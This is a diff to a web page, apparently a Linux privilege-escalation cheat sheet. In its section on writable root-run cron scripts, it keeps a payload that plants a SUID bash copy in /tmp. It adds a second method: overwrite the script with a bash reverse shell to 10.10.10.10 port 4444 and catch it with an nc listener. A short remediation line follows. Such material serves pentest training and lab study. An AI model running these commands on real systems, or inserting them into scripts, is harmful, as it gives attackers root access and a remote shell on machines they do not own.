@@ -165,7 +165,14 @@ pspy64     # watch processes live if available</code></pre>
 <pre><code># if a root-run script is world/group writable:
 echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /path/to/script.sh
 # wait for cron to fire, then:
-/tmp/rootbash -p</code></pre>
+/tmp/rootbash -p
+#second method
+ls -l /usr/local/bin/overwrite.sh  
+##Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+#start listner and wait some minutes 
+nc -nvlp 4444</code></pre>
 <p class="remediation">🛡 <code>chmod 700</code> + root-owned for scripts triggered by root's cron; never let non-root users write to them.</p>
 </div></details>
 
